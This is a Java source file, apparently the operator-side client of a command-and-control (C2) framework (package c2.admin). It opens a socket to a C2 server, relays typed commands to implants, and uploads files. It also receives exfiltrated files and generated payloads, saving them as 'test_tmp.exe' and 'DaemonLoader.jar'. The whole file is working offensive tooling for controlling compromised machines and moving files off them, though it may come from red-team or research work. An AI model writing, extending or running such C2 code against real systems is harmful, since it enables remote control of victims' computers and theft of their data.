package c2.admin;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.Console;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintStream;
import java.net.Socket;
import java.net.UnknownHostException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import c2.session.CommandWizard;
import util.Time;

public class LocalConnection {
	
	public static String CMD_QUIT_LOCAL = "quitLocal";
	
	public static Path CSHARP_TMP_FILE = Paths.get("test_tmp.exe");
	public static Path JAVA_TMP_FILE = Paths.get("DaemonLoader.jar");

	public static void main(String args[]) throws NumberFormatException, UnknownHostException, IOException {
		LocalConnection lc = new LocalConnection();
		lc.engage(args, new BufferedReader(new InputStreamReader(System.in)), System.out);
	}

	public void engage(String args[], BufferedReader stdIn, PrintStream terminalOut)
			throws NumberFormatException, UnknownHostException, IOException {
		Socket remote = new Socket(args[0], Integer.parseInt(args[1]));

		OutputStreamWriter bw = new OutputStreamWriter(new BufferedOutputStream(remote.getOutputStream()));
		BufferedReader br = new BufferedReader(new InputStreamReader(remote.getInputStream()));

		boolean stayAlive = true;

		// BufferedReader cReader = new BufferedReader(console.reader());

		Runnable printer = new Runnable() {
			public void run() {
				while (true) {
					try {
						String output = br.readLine();
						if (output != null) {
							if (output.startsWith("<control> uplinked ")) {
								String[] elements = output.split(" ");
								byte[] data = Base64.getDecoder().decode(elements[3]);
								try (OutputStream stream = new FileOutputStream(elements[2])) {
									stream.write(data);
								}
								terminalOut.println("Received File");
							}else if(output.startsWith("<control> " + CommandWizard.CMD_GENERATE_CSHARP)) {
								String[] elements = output.split(" ");
								byte[] data = Base64.getDecoder().decode(elements[2]);
								try (OutputStream stream = new FileOutputStream(CSHARP_TMP_FILE.toFile())) {
									stream.write(data);
								}
								terminalOut.println("Exe downloaded");
							}else if(output.startsWith("<control> " + CommandWizard.CMD_GENERATE_JAVA)) {
								String[] elements = output.split(" ");
								byte[] data = Base64.getDecoder().decode(elements[2]);
								try (OutputStream stream = new FileOutputStream(JAVA_TMP_FILE.toFile())) {
									stream.write(data);
								}
								terminalOut.println("Jar downloaded");
							} else {
								terminalOut.println(output);
							}
						}
					} catch (Exception e) {
						// Keep going
					}
				}
			}
		};

		ExecutorService es = Executors.newCachedThreadPool();
		es.submit(printer);

		while (stayAlive) {

			String nextCmd = stdIn.readLine();
			if (nextCmd.equals(CMD_QUIT_LOCAL)) {
				stayAlive = false;
			} else if (nextCmd.startsWith("sendFile")) {
				// TODO: need to handle bad command format here
				String filename = nextCmd.split(" ")[1];
				// TODO: handle exception from bad name
				byte[] fileBytes = Files.readAllBytes(Paths.get(filename));
				byte[] encoded = Base64.getEncoder().encode(fileBytes);
				String encodedString = new String(encoded, StandardCharsets.US_ASCII);
				bw.write("<control> download " + Paths.get(filename).getFileName().toString().replaceAll(" ", "_") + " "
						+ encodedString + System.lineSeparator());
				bw.flush();
			}else if(nextCmd.equals("sleep")) {
				Time.sleepWrapped(10000);
			} else {
				bw.write(nextCmd + System.lineSeparator());
				bw.flush();
			}
		}

		remote.close();
	}
}
